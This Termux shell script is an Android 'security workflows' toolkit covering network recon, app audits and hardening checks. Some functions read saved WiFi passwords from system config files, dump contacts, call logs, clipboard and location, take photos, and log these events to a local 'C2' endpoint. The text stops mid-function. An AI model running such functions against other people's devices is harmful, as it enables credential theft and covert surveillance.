#!/data/data/com.termux/files/usr/bin/bash
# ══════════════════════════════════════════════════
# Phone Security Workflows — Shizuku/rish + C2
# Bug bounty, network security, device hardening
# ══════════════════════════════════════════════════

export RISH_APPLICATION_ID=com.termux
C2_HOME="${C2_HOME:-$HOME/c2}"
RECON_DIR="$C2_HOME/recon"
RISH="$HOME/rish"

RED="\033[0;31m"; GRN="\033[0;32m"; YLW="\033[0;33m"
CYN="\033[0;36m"; WHT="\033[1;37m"; DIM="\033[2m"
RST="\033[0m"; BLD="\033[1m"

_rish() { "$RISH" -c "$*" 2>/dev/null; }

_fire_event() {
  local etype="$1"; shift
  local data="$*"
  curl -s -X POST "http://127.0.0.1:9800/${etype}" \
    -H "Content-Type: application/json" \
    -d "$data" >/dev/null 2>&1
}

# ── Network Discovery ────────────────────────────

wf_netdiscover() {
  echo -e "${BLD}${CYN}═══ Network Discovery ═══${RST}"

  # Get current WiFi info via rish
  echo -e "${WHT}WiFi Info:${RST}"
  _rish "dumpsys wifi | grep -E 'mWifiInfo|SSID|BSSID|Link speed|IP address'" 2>/dev/null | head -10

  # Get gateway
  local gw=$(ip route | grep default | awk '{print $3}' | head -1)
  local subnet=$(ip -4 addr show wlan0 2>/dev/null | grep inet | awk '{print $2}')
  echo -e "  Gateway: ${WHT}$gw${RST}"
  echo -e "  Subnet:  ${WHT}$subnet${RST}"

  # ARP scan
  echo ""
  echo -e "${WHT}Live Hosts (ARP):${RST}"
  ip neigh show 2>/dev/null | grep -v FAILED | while read -r line; do
    echo -e "  $line"
  done

  # Nmap ping sweep
  if command -v nmap &>/dev/null && [ -n "$gw" ]; then
    local net="${gw%.*}.0/24"
    echo ""
    echo -e "${CYN}Nmap ping sweep: $net${RST}"
    nmap -sn "$net" -oG "$RECON_DIR/netscan_$(date +%Y%m%d).txt" 2>/dev/null | grep "Host:"
    local count=$(grep -c "Host:" "$RECON_DIR/netscan_$(date +%Y%m%d).txt" 2>/dev/null || echo 0)
    _fire_event "recon/netdiscover" "{\"subnet\":\"$net\",\"hosts\":$count}"
  fi

  # Connected devices via rish
  echo ""
  echo -e "${WHT}Nearby Devices (Bluetooth):${RST}"
  _rish "dumpsys bluetooth_manager | grep -A2 'Bonded devices'" 2>/dev/null | head -10

  echo ""
  echo -e "${GRN}Network discovery complete${RST}"
}

# ── App Security Audit ───────────────────────────

wf_app_audit() {
  local target_pkg="${1:-}"
  echo -e "${BLD}${CYN}═══ App Security Audit ═══${RST}"

  if [ -z "$target_pkg" ]; then
    # List all 3rd party packages
    echo -e "${WHT}3rd-party apps:${RST}"
    _rish "pm list packages -3" | sed 's/package:/  /' | sort
    echo ""
    echo -e "Usage: ${WHT}wf app-audit <package.name>${RST}"
    return
  fi

  echo -e "${WHT}Package:${RST} $target_pkg"
  echo ""

  # Package info
  echo -e "${CYN}Permissions:${RST}"
  _rish "dumpsys package $target_pkg" 2>/dev/null | grep -A100 "requested permissions:" | grep -B0 "install permissions:" | grep "android.permission" | sed 's/^/  /'

  echo ""
  echo -e "${CYN}Exported Components:${RST}"
  _rish "dumpsys package $target_pkg" 2>/dev/null | grep -E "exported=true" | sed 's/^/  /' | head -20

  echo ""
  echo -e "${CYN}Network Security:${RST}"
  # Check if app has cleartext traffic
  _rish "dumpsys package $target_pkg" 2>/dev/null | grep -iE "usesCleartextTraffic|networkSecurityConfig" | sed 's/^/  /'

  # Check running services
  echo ""
  echo -e "${CYN}Running Services:${RST}"
  _rish "dumpsys activity services $target_pkg" 2>/dev/null | grep -E "ServiceRecord|intent=" | head -10 | sed 's/^/  /'

  # Data directory size
  echo ""
  echo -e "${CYN}Storage:${RST}"
  _rish "du -sh /data/data/$target_pkg 2>/dev/null" | sed 's/^/  /'

  _fire_event "security/app_audit" "{\"package\":\"$target_pkg\"}"
}

# ── OTG Attack Surface ───────────────────────────

wf_otg() {
  echo -e "${BLD}${CYN}═══ OTG/USB Attack Surface ═══${RST}"

  echo -e "${WHT}USB State:${RST}"
  _rish "dumpsys usb | grep -E 'USB State|Functions|mConnected|mConfigured'" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}USB Devices:${RST}"
  _rish "ls -la /dev/bus/usb/*/ 2>/dev/null" | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Network Interfaces:${RST}"
  ip link show 2>/dev/null | grep -E "^[0-9]|link/" | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Available USB functions:${RST}"
  _rish "cat /config/usb_gadget/g1/configs/b.1/strings/0x409/configuration 2>/dev/null" | sed 's/^/  /'

  # Check if we can enable RNDIS (USB tethering for MITM)
  echo ""
  echo -e "${DIM}To enable USB tethering (MITM):${RST}"
  echo -e "  ${WHT}rish -c 'svc usb setFunctions rndis'${RST}"
  echo -e "  ${WHT}rish -c 'svc usb setFunctions mtp'${RST}  (restore)"
}

# ── WiFi Security ────────────────────────────────

wf_wifi() {
  echo -e "${BLD}${CYN}═══ WiFi Security ═══${RST}"

  echo -e "${WHT}Current Connection:${RST}"
  _rish "cmd wifi status" 2>/dev/null | head -20 | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Saved Networks:${RST}"
  _rish "cmd wifi list-networks" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}WiFi Scan Results:${RST}"
  _rish "cmd wifi start-scan" 2>/dev/null
  sleep 2
  _rish "cmd wifi list-scan-results" 2>/dev/null | head -30 | sed 's/^/  /'

  echo ""
  echo -e "${WHT}DNS Servers:${RST}"
  _rish "getprop net.dns1; getprop net.dns2" 2>/dev/null | sed 's/^/  /'

  _fire_event "security/wifi_audit" "{\"action\":\"scan\"}"
}

# ── Device Hardening Check ───────────────────────

wf_harden() {
  echo -e "${BLD}${CYN}═══ Device Security Check ═══${RST}"

  echo -e "${WHT}SELinux:${RST}"
  _rish "getenforce" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Developer Options:${RST}"
  _rish "settings get global development_settings_enabled" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}ADB over WiFi:${RST}"
  _rish "settings get global adb_wifi_enabled" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Unknown Sources:${RST}"
  _rish "settings get secure install_non_market_apps" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}USB Debugging:${RST}"
  _rish "settings get global adb_enabled" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Lock Screen:${RST}"
  _rish "dumpsys lock_settings | grep -iE 'LockPattern|quality'" 2>/dev/null | head -5 | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Encryption:${RST}"
  _rish "getprop ro.crypto.state" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Bootloader:${RST}"
  _rish "getprop ro.boot.verifiedbootstate" 2>/dev/null | sed 's/^/  /'
  _rish "getprop ro.boot.flash.locked" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Security Patch Level:${RST}"
  _rish "getprop ro.build.version.security_patch" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Installed CAs (user):${RST}"
  ls /data/misc/user/0/cacerts-added/ 2>/dev/null | wc -l | sed 's/^/  /' || echo "  0"

  _fire_event "security/harden_check" "{\"device\":\"phone\"}"
}

# ── Traffic Intercept (PCAPdroid) ────────────────

wf_capture() {
  local action="${1:-start}"
  echo -e "${BLD}${CYN}═══ Traffic Capture ═══${RST}"

  case "$action" in
    start)
      echo -e "${CYN}Starting PCAPdroid capture...${RST}"
      _rish "am start -n com.emanuelef.remote_capture/.activities.CaptureCtrl -a com.emanuelef.remote_capture.CaptureCtrl.START --ei pcap_dump_mode 2" 2>/dev/null
      echo -e "${GRN}Capture started — VPN mode${RST}"
      _fire_event "capture/start" "{\"tool\":\"pcapdroid\"}"
      ;;
    stop)
      echo -e "${YLW}Stopping PCAPdroid capture...${RST}"
      _rish "am start -n com.emanuelef.remote_capture/.activities.CaptureCtrl -a com.emanuelef.remote_capture.CaptureCtrl.STOP" 2>/dev/null
      echo -e "${GRN}Capture stopped${RST}"
      _fire_event "capture/stop" "{\"tool\":\"pcapdroid\"}"
      ;;
    *)
      echo "Usage: wf capture [start|stop]"
      ;;
  esac
}

# ── Firewall Control (RethinkDNS) ────────────────

wf_firewall() {
  local action="${1:-status}"
  echo -e "${BLD}${CYN}═══ Firewall Control ═══${RST}"

  case "$action" in
    status)
      _rish "dumpsys package com.celzero.bravedns" 2>/dev/null | grep -E "versionName|firstInstall" | sed 's/^/  /'
      echo ""
      echo -e "${DIM}RethinkDNS controls: open app for DNS/firewall rules${RST}"
      ;;
    block)
      local pkg="${2:?Usage: wf firewall block <package>}"
      echo -e "${RED}Blocking network for: $pkg${RST}"
      _rish "cmd netpolicy add restrict-background-whitelist $pkg false" 2>/dev/null
      _rish "cmd netpolicy set uid-policy $(cmd package list packages -U $pkg | awk -F: '{print $3}') reject" 2>/dev/null
      _fire_event "firewall/block" "{\"package\":\"$pkg\"}"
      ;;
    *)
      echo "Usage: wf firewall [status|block <pkg>]"
      ;;
  esac
}

# ── App Freezer (Hail/Shizuku) ──────────────────

wf_freeze() {
  local action="${1:-list}"
  local pkg="$2"

  case "$action" in
    disable)
      [ -z "$pkg" ] && { echo "Usage: wf freeze disable <package>"; return; }
      echo -e "${YLW}Disabling: $pkg${RST}"
      _rish "pm disable-user --user 0 $pkg" 2>/dev/null
      _fire_event "security/app_disabled" "{\"package\":\"$pkg\"}"
      ;;
    enable)
      [ -z "$pkg" ] && { echo "Usage: wf freeze enable <package>"; return; }
      echo -e "${GRN}Enabling: $pkg${RST}"
      _rish "pm enable $pkg" 2>/dev/null
      _fire_event "security/app_enabled" "{\"package\":\"$pkg\"}"
      ;;
    list)
      echo -e "${WHT}Disabled packages:${RST}"
      _rish "pm list packages -d" 2>/dev/null | sed 's/package:/  /'
      ;;
    *)
      echo "Usage: wf freeze [list|disable|enable] [package]"
      ;;
  esac
}

# ── Process & Service Monitor ────────────────────

wf_monitor() {
  echo -e "${BLD}${CYN}═══ Process Monitor ═══${RST}"

  echo -e "${WHT}Top Processes (by CPU):${RST}"
  _rish "top -n 1 -b" 2>/dev/null | head -15 | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Network Connections:${RST}"
  _rish "cat /proc/net/tcp" 2>/dev/null | head -20 | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Listening Ports:${RST}"
  ss -tlnp 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Active Network:${RST}"
  _rish "dumpsys connectivity | grep -E 'NetworkAgentInfo|type|CONNECTED'" 2>/dev/null | head -10 | sed 's/^/  /'
}

# ── Logcat Security Monitor ─────────────────────

wf_logwatch() {
  local filter="${1:-security}"
  echo -e "${BLD}${CYN}═══ Security Log Watch ═══${RST}"
  echo -e "${DIM}Ctrl+C to stop${RST}"
  echo ""

  case "$filter" in
    security)
      _rish "logcat -d | grep -iE 'permission|denied|violation|exploit|inject|overflow|shell|root|su |magisk'" | tail -50
      ;;
    network)
      _rish "logcat -d | grep -iE 'connect|socket|dns|http|tcp|udp|ssl|tls|cert'" | tail -50
      ;;
    all)
      _rish "logcat -d -b security" 2>/dev/null | tail -50
      ;;
    live)
      _rish "logcat -b security"
      ;;
    *)
      echo "Usage: wf logwatch [security|network|all|live]"
      ;;
  esac
}

# ── Quick Recon from Phone ───────────────────────

wf_recon() {
  local target="${1:?Usage: wf recon <domain|ip>}"
  local outdir="$RECON_DIR/$target"
  mkdir -p "$outdir"

  echo -e "${BLD}${CYN}═══ Mobile Recon: $target ═══${RST}"

  # DNS
  echo -e "${WHT}DNS Lookup:${RST}"
  nslookup "$target" 2>/dev/null | sed 's/^/  /'

  # Whois
  if command -v whois &>/dev/null; then
    echo ""
    echo -e "${WHT}Whois (summary):${RST}"
    whois "$target" 2>/dev/null | grep -iE "^org|^net|^country|^descr|^admin|^abuse|^cidr" | head -10 | sed 's/^/  /'
  fi

  # Quick port scan
  echo ""
  echo -e "${WHT}Port Scan (top 100):${RST}"
  nmap -F --top-ports 100 "$target" -oN "$outdir/quick_scan.txt" 2>/dev/null | grep -E "open|closed|filtered" | sed 's/^/  /'

  # HTTP probe
  echo ""
  echo -e "${WHT}HTTP Headers:${RST}"
  curl -sI "https://$target" 2>/dev/null | head -15 | sed 's/^/  /'

  # SSL cert
  echo ""
  echo -e "${WHT}SSL Certificate:${RST}"
  echo | openssl s_client -connect "$target:443" -servername "$target" 2>/dev/null | openssl x509 -noout -subject -issuer -dates 2>/dev/null | sed 's/^/  /'

  _fire_event "recon/mobile" "{\"target\":\"$target\"}"
  echo ""
  echo -e "${GRN}Results in: $outdir/${RST}"
}

# ── SMS & Messaging ──────────────────────────────

wf_sms_send() {
  local num="${1:?Usage: wf sms-send <number> <message>}"
  shift
  local msg="$*"
  [ -z "$msg" ] && { echo "Usage: wf sms-send <number> <message>"; return 1; }
  echo -e "${CYN}Sending SMS to $num...${RST}"
  termux-sms-send -n "$num" "$msg"
  echo -e "${GRN}SMS sent${RST}"
  _fire_event "comms/sms_sent" "{\"to\":\"$num\",\"length\":${#msg}}"
}

wf_sms_monitor() {
  local count="${1:-20}"
  local state_file="$C2_HOME/.sms_last_id"
  echo -e "${BLD}${CYN}═══ SMS Monitor ═══${RST}"

  local inbox
  inbox=$(termux-sms-list -l "$count" -t inbox 2>/dev/null)
  if [ -z "$inbox" ]; then
    echo -e "${DIM}No messages or termux-api not available${RST}"
    return
  fi

  local last_id=0
  [ -f "$state_file" ] && last_id=$(cat "$state_file" 2>/dev/null || echo 0)

  echo "$inbox" | python3 -c "
import sys, json
msgs = json.load(sys.stdin)
last = int('${last_id}')
new_count = 0
for m in msgs:
    mid = m.get('_id', 0)
    marker = ' ${GRN}[NEW]${RST}' if mid > last else ''
    if mid > last: new_count += 1
    print(f\"  {m.get('number','?'):15} {m.get('received','?')[:19]}  {m.get('body','')[:60]}{marker}\")
if msgs:
    print(msgs[0].get('_id', 0), file=open('${state_file}', 'w'))
print(f'\n  {new_count} new message(s)' if new_count else '')
" 2>/dev/null
}

# ── Device Intel ─────────────────────────────────

wf_device_info() {
  echo -e "${BLD}${CYN}═══ Device Info ═══${RST}"

  echo -e "${WHT}Telephony:${RST}"
  termux-telephony-deviceinfo 2>/dev/null | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    for k,v in d.items(): print(f'  {k}: {v}')
except: print('  unavailable')
" 2>/dev/null

  echo ""
  echo -e "${WHT}Battery:${RST}"
  termux-battery-status 2>/dev/null | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print(f\"  Level: {d.get('percentage','')}% ({d.get('status','')}) Temp: {d.get('temperature','')}C\")
    print(f\"  Plugged: {d.get('plugged','')} Health: {d.get('health','')}\")
except: print('  unavailable')
" 2>/dev/null

  echo ""
  echo -e "${WHT}SIM/Carrier:${RST}"
  termux-telephony-cellinfo 2>/dev/null | python3 -c "
import sys, json
try:
    cells = json.load(sys.stdin)
    for c in cells[:3]: print(f\"  {c.get('type','?')}: {json.dumps(c.get('registered',False))} MCC={c.get('mcc','')} MNC={c.get('mnc','')}\")
except: print('  unavailable')
" 2>/dev/null

  _fire_event "device/info" "{\"action\":\"device_info\"}"
}

wf_location() {
  echo -e "${CYN}Getting location...${RST}"
  local loc
  loc=$(termux-location -p network -r once 2>/dev/null)
  if [ -z "$loc" ]; then
    echo -e "${YLW}Trying GPS provider...${RST}"
    loc=$(termux-location -p gps -r once 2>/dev/null)
  fi
  if [ -z "$loc" ]; then
    echo -e "${RED}Location unavailable${RST}"
    return 1
  fi
  echo "$loc" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(f\"  Lat:  {d.get('latitude','?')}\")
print(f\"  Lon:  {d.get('longitude','?')}\")
print(f\"  Acc:  {d.get('accuracy','?')}m\")
print(f\"  Alt:  {d.get('altitude','?')}m\")
print(f\"  Provider: {d.get('provider','?')}\")
" 2>/dev/null
  _fire_event "device/location" "$loc"
}

wf_screenshot() {
  local outfile="/sdcard/ss_$(date +%Y%m%d_%H%M%S).png"
  echo -e "${CYN}Taking screenshot...${RST}"
  _rish "screencap -p $outfile"
  if [ -f "$outfile" ]; then
    local size=$(du -h "$outfile" 2>/dev/null | cut -f1)
    echo -e "${GRN}Screenshot saved: $outfile ($size)${RST}"
    _fire_event "device/screenshot" "{\"path\":\"$outfile\"}"
  else
    echo -e "${RED}Screenshot failed${RST}"
  fi
}

wf_camera() {
  local cam="${1:-0}"
  local outfile="/sdcard/cam_${cam}_$(date +%Y%m%d_%H%M%S).jpg"
  echo -e "${CYN}Capturing from camera $cam...${RST}"
  termux-camera-photo -c "$cam" "$outfile" 2>/dev/null
  if [ -f "$outfile" ]; then
    local size=$(du -h "$outfile" 2>/dev/null | cut -f1)
    echo -e "${GRN}Photo saved: $outfile ($size)${RST}"
    _fire_event "device/camera" "{\"cam\":$cam,\"path\":\"$outfile\"}"
  else
    echo -e "${RED}Camera capture failed${RST}"
  fi
}

wf_clipboard() {
  echo -e "${BLD}${CYN}═══ Clipboard ═══${RST}"
  local clip
  clip=$(termux-clipboard-get 2>/dev/null)
  if [ -n "$clip" ]; then
    echo -e "${WHT}Contents:${RST}"
    echo "  $clip"
    _fire_event "device/clipboard" "{\"length\":${#clip}}"
  else
    echo -e "${DIM}Clipboard empty${RST}"
  fi
}

wf_contacts() {
  echo -e "${BLD}${CYN}═══ Contacts ═══${RST}"
  termux-contact-list 2>/dev/null | python3 -c "
import sys, json
try:
    contacts = json.load(sys.stdin)
    for c in contacts:
        print(f\"  {c.get('name','?'):25} {c.get('number','?')}\")
    print(f'\n  Total: {len(contacts)} contacts')
except: print('  unavailable')
" 2>/dev/null
  _fire_event "device/contacts" "{\"action\":\"dump\"}"
}

wf_call_log() {
  echo -e "${BLD}${CYN}═══ Call Log ═══${RST}"
  _rish "content query --uri content://call_log/calls --projection number:type:date:duration --sort 'date DESC' --limit 20" 2>/dev/null | while read -r line; do
    echo "  $line"
  done
  _fire_event "device/call_log" "{\"action\":\"dump\"}"
}

wf_content_query() {
  local uri="${1:?Usage: wf content-query <content://uri>}"
  shift
  local extra="$*"
  echo -e "${CYN}Querying: $uri${RST}"
  _rish "content query --uri $uri $extra" 2>/dev/null | head -50
}

# ── WiFi/Network Assessment ──────────────────────

wf_wifi_monitor() {
  echo -e "${BLD}${CYN}═══ WiFi Monitor ═══${RST}"
  local baseline="$C2_HOME/.wifi_baseline"

  # Current scan
  _rish "cmd wifi start-scan" 2>/dev/null
  sleep 2
  local scan
  scan=$(_rish "cmd wifi list-scan-results" 2>/dev/null)

  if [ -f "$baseline" ]; then
    echo -e "${WHT}Comparing against baseline...${RST}"
    local new_aps
    new_aps=$(diff <(sort "$baseline") <(echo "$scan" | sort) 2>/dev/null | grep "^>" | sed 's/^> //')
    if [ -n "$new_aps" ]; then
      echo -e "${RED}New/Changed APs detected:${RST}"
      echo "$new_aps" | while read -r line; do echo -e "  ${YLW}$line${RST}"; done
      _fire_event "security/wifi_rogue" "{\"new_aps\":\"$(echo "$new_aps" | head -3 | tr '\n' ' ')\"}"
    else
      echo -e "${GRN}No changes from baseline${RST}"
    fi
  else
    echo -e "${WHT}Creating baseline...${RST}"
  fi
  echo "$scan" > "$baseline"

  echo ""
  echo -e "${WHT}Current APs:${RST}"
  echo "$scan" | head -20 | sed 's/^/  /'

  # Check for deauth events in logcat
  echo ""
  echo -e "${WHT}Recent deauth events:${RST}"
  local deauths
  deauths=$(_rish "logcat -d -b main -t 100" 2>/dev/null | grep -iE "deauth|disassoc|reason=" | tail -5)
  if [ -n "$deauths" ]; then
    echo -e "${RED}$deauths${RST}" | sed 's/^/  /'
    _fire_event "security/wifi_deauth" "{\"events\":\"detected\"}"
  else
    echo -e "  ${GRN}None detected${RST}"
  fi
}

wf_arp_watch() {
  echo -e "${BLD}${CYN}═══ ARP Watch ═══${RST}"
  local baseline="$C2_HOME/.arp_baseline"
  local current
  current=$(ip neigh show 2>/dev/null | grep -v FAILED | sort)

  if [ -f "$baseline" ]; then
    local changes
    changes=$(diff <(cat "$baseline") <(echo "$current") 2>/dev/null)
    if [ -n "$changes" ]; then
      echo -e "${RED}ARP table changes detected:${RST}"
      echo "$changes" | grep "^[<>]" | while read -r line; do
        echo -e "  ${YLW}$line${RST}"
      done

      # Check gateway MAC change specifically
      local gw=$(ip route | grep default | awk '{print $3}' | head -1)
      local old_gw_mac=$(grep "$gw " "$baseline" 2>/dev/null | awk '{print $5}')
      local new_gw_mac=$(echo "$current" | grep "$gw " | awk '{print $5}')
      if [ -n "$old_gw_mac" ] && [ -n "$new_gw_mac" ] && [ "$old_gw_mac" != "$new_gw_mac" ]; then
        echo -e "  ${RED}${BLD}CRITICAL: Gateway MAC changed! $old_gw_mac -> $new_gw_mac${RST}"
        _fire_event "security/arp_spoof" "{\"gateway\":\"$gw\",\"old_mac\":\"$old_gw_mac\",\"new_mac\":\"$new_gw_mac\"}"
      fi
    else
      echo -e "${GRN}No ARP changes from baseline${RST}"
    fi
  else
    echo -e "${WHT}Creating ARP baseline...${RST}"
  fi
  echo "$current" > "$baseline"

  echo ""
  echo -e "${WHT}Current ARP table:${RST}"
  echo "$current" | sed 's/^/  /'
}

wf_dns_leak() {
  echo -e "${BLD}${CYN}═══ DNS Leak Test ═══${RST}"

  local system_dns=$(_rish "getprop net.dns1" 2>/dev/null)
  echo -e "  System DNS: ${WHT}${system_dns:-unknown}${RST}"

  # Query canary domain via system resolver
  echo ""
  echo -e "${WHT}System resolver:${RST}"
  nslookup whoami.akamai.net 2>/dev/null | grep -E "Address|Name" | sed 's/^/  /'

  # Query via known-good resolver
  echo ""
  echo -e "${WHT}Google DNS (8.8.8.8):${RST}"
  nslookup whoami.akamai.net 8.8.8.8 2>/dev/null | grep -E "Address|Name" | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Cloudflare (1.1.1.1):${RST}"
  nslookup whoami.akamai.net 1.1.1.1 2>/dev/null | grep -E "Address|Name" | sed 's/^/  /'

  _fire_event "security/dns_leak_test" "{\"system_dns\":\"$system_dns\"}"
}

wf_service_discovery() {
  echo -e "${BLD}${CYN}═══ Service Discovery ═══${RST}"

  local gw=$(ip route | grep default | awk '{print $3}' | head -1)
  local subnet="${gw%.*}.0/24"

  # mDNS via nmap
  if command -v nmap &>/dev/null; then
    echo -e "${WHT}mDNS/Bonjour services:${RST}"
    nmap -sU -p 5353 --script=dns-service-discovery "$subnet" 2>/dev/null | grep -E "open|mdns|service" | head -20 | sed 's/^/  /'
  fi

  # SSDP M-SEARCH
  echo ""
  echo -e "${WHT}SSDP/UPnP devices:${RST}"
  if command -v socat &>/dev/null; then
    local msearch="M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n"
    echo -e "$msearch" | socat -T3 UDP4-DATAGRAM:239.255.255.250:1900,broadcast STDIO 2>/dev/null | grep -E "LOCATION|SERVER|ST:" | sort -u | head -15 | sed 's/^/  /'
  else
    echo -e "  ${DIM}socat not available — install with: pkg install socat${RST}"
  fi

  _fire_event "recon/service_discovery" "{\"subnet\":\"$subnet\"}"
}

wf_wifi_passwords() {
  echo -e "${BLD}${CYN}═══ WiFi Passwords ═══${RST}"
  echo -e "${WHT}Saved networks:${RST}"
  _rish "cmd wifi list-networks" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}WiFi config extraction:${RST}"
  # Try to read wpa_supplicant or equivalent
  _rish "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null" | grep -E "SSID|PreSharedKey|string name=\"SSID\"" | head -30 | sed 's/^/  /'
  _rish "cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null" | grep -E "SSID|PreSharedKey|string name=\"SSID\"" | head -30 | sed 's/^/  /'

  _fire_event "security/wifi_passwords" "{\"action\":\"extract\"}"
}

wf_pcap_analyze() {
  echo -e "${BLD}${CYN}═══ Network Analysis ═══${RST}"

  echo -e "${WHT}TCP connections (/proc/net/tcp):${RST}"
  cat /proc/net/tcp 2>/dev/null | awk 'NR>1{
    split($2,local,":");split($3,remote,":");
    lp=strtonum("0x"local[2]);rp=strtonum("0x"remote[2]);
    if(rp>0) printf "  local:%d -> remote:%d state=%s\n",lp,rp,$4
  }' | head -20

  echo ""
  echo -e "${WHT}TCP6 connections:${RST}"
  cat /proc/net/tcp6 2>/dev/null | awk 'NR>1{split($2,l,":");split($3,r,":");rp=strtonum("0x"r[2]);if(rp>0) printf "  port %d -> %d state=%s\n",strtonum("0x"l[2]),rp,$4}' | head -15

  echo ""
  echo -e "${WHT}Active sockets:${RST}"
  ss -tunp 2>/dev/null | head -20 | sed 's/^/  /'

  _fire_event "security/pcap_analyze" "{\"action\":\"summary\"}"
}

# ── Shizuku Advanced ─────────────────────────────

wf_call_monitor() {
  echo -e "${BLD}${CYN}═══ Call State Monitor ═══${RST}"
  _rish "dumpsys telephony.registry" 2>/dev/null | grep -E "mCallState|mCallIncomingNumber|mForegroundCallState|mRingingCallState" | sed 's/^/  /'
  _fire_event "device/call_state" "{\"action\":\"check\"}"
}

wf_perm_manage() {
  local action="${1:?Usage: wf perm <grant|revoke> <package> <permission>}"
  local pkg="${2:?Package required}"
  local perm="${3:?Permission required}"
  echo -e "${CYN}${action}: $perm for $pkg${RST}"
  _rish "pm $action $pkg $perm"
  local rc=$?
  if [ $rc -eq 0 ]; then
    echo -e "${GRN}Done${RST}"
  else
    echo -e "${RED}Failed (rc=$rc)${RST}"
  fi
  _fire_event "device/perm_manage" "{\"action\":\"$action\",\"package\":\"$pkg\",\"permission\":\"$perm\"}"
}

wf_notify_inject() {
  local title="${1:?Usage: wf notify <title> <message>}"
  shift
  local msg="$*"
  echo -e "${CYN}Injecting notification...${RST}"
  _rish "cmd notification post -S bigtext -t '$title' 'c2_notify' '$msg'"
  echo -e "${GRN}Notification posted${RST}"
}

wf_settings() {
  local action="${1:?Usage: wf settings <put|get> <global|secure|system> <key> [value]}"
  local ns="${2:?Namespace required (global/secure/system)}"
  local key="${3:?Key required}"
  local val="$4"

  case "$action" in
    get)
      echo -e "${WHT}$ns/$key:${RST}"
      _rish "settings get $ns $key" 2>/dev/null | sed 's/^/  /'
      ;;
    put)
      [ -z "$val" ] && { echo "Value required for put"; return 1; }
      echo -e "${CYN}Setting $ns/$key = $val${RST}"
      _rish "settings put $ns $key $val"
      echo -e "${GRN}Done${RST}"
      _fire_event "device/settings" "{\"action\":\"put\",\"ns\":\"$ns\",\"key\":\"$key\",\"value\":\"$val\"}"
      ;;
    *)
      echo "Usage: wf settings <put|get> <global|secure|system> <key> [value]"
      ;;
  esac
}

wf_ui_auto() {
  local action="${1:?Usage: wf ui <tap|swipe|text|key> <args>}"
  shift
  case "$action" in
    tap)
      local x="${1:?X coordinate}" y="${2:?Y coordinate}"
      _rish "input tap $x $y"
      echo -e "${GRN}Tapped ($x, $y)${RST}"
      ;;
    swipe)
      local x1="${1:?X1}" y1="${2:?Y1}" x2="${3:?X2}" y2="${4:?Y2}" dur="${5:-300}"
      _rish "input swipe $x1 $y1 $x2 $y2 $dur"
      echo -e "${GRN}Swiped ($x1,$y1)->($x2,$y2)${RST}"
      ;;
    text)
      local txt="$*"
      _rish "input text '$(echo "$txt" | sed "s/ /%s/g")'"
      echo -e "${GRN}Typed text${RST}"
      ;;
    key)
      local keycode="${1:?Keycode required (e.g. KEYCODE_HOME)}"
      _rish "input keyevent $keycode"
      echo -e "${GRN}Sent keyevent $keycode${RST}"
      ;;
    *)
      echo "Usage: wf ui <tap x y|swipe x1 y1 x2 y2|text ...|key KEYCODE>"
      ;;
  esac
}

wf_app_usage() {
  echo -e "${BLD}${CYN}═══ App Usage ═══${RST}"
  echo -e "${WHT}Current foreground:${RST}"
  _rish "dumpsys activity" 2>/dev/null | grep -E "topActivity|mResumedActivity|mFocusedActivity" | head -5 | sed 's/^/  /'
  echo ""
  echo -e "${WHT}Recent tasks:${RST}"
  _rish "dumpsys activity recents" 2>/dev/null | grep -E "realActivity|TaskRecord" | head -10 | sed 's/^/  /'
  _fire_event "device/app_usage" "{\"action\":\"check\"}"
}

wf_device_profile() {
  echo -e "${BLD}${CYN}═══ Device Profile ═══${RST}"

  echo -e "${WHT}Battery:${RST}"
  _rish "dumpsys battery" 2>/dev/null | grep -E "level|status|health|voltage|temperature" | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Disk:${RST}"
  df -h /data /sdcard 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Memory:${RST}"
  _rish "cat /proc/meminfo" 2>/dev/null | head -5 | sed 's/^/  /'

  echo ""
  echo -e "${WHT}CPU:${RST}"
  _rish "cat /proc/cpuinfo" 2>/dev/null | grep -E "^processor|^model name|^Hardware" | head -5 | sed 's/^/  /'

  _fire_event "device/profile" "{\"action\":\"check\"}"
}

wf_intent_fire() {
  local action="${1:?Usage: wf intent <action> [extras...]}"
  shift
  local extras="$*"
  echo -e "${CYN}Firing intent: $action $extras${RST}"
  if echo "$action" | grep -qE "^android\.|^com\."; then
    _rish "am broadcast -a $action $extras" 2>/dev/null
  else
    _rish "am start -a $action $extras" 2>/dev/null
  fi
  _fire_event "device/intent" "{\"action\":\"$action\"}"
}

wf_app_watch() {
  echo -e "${BLD}${CYN}═══ App Watch ═══${RST}"
  local baseline="$C2_HOME/.apps_baseline"
  local current
  current=$(_rish "pm list packages -3" 2>/dev/null | sort)

  if [ -f "$baseline" ]; then
    local new_apps
    new_apps=$(diff <(cat "$baseline") <(echo "$current") 2>/dev/null | grep "^>" | sed 's/^> package://')
    local removed_apps
